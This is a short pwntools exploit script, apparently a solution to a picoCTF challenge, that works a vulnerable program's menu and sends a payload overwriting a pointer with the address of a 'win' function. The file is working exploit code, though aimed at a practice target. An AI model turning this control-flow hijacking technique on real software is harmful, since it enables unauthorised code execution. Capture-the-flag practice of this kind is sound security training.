#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched")

context.binary = exe
context.terminal = ["alacritty"]


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 58574)

    return r


def main():
    r = conn()
    r.sendlineafter(b'(e)xit', 'i')
    r.sendlineafter(b'(Y/N)', 'Y')
    r.sendlineafter(b'(e)xit', 'l')
    payload = p32(0x080487d6) # FUNC WIN
    payload += b'd3bo'   # USERNAME
    r.sendlineafter(b':', payload)
    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()

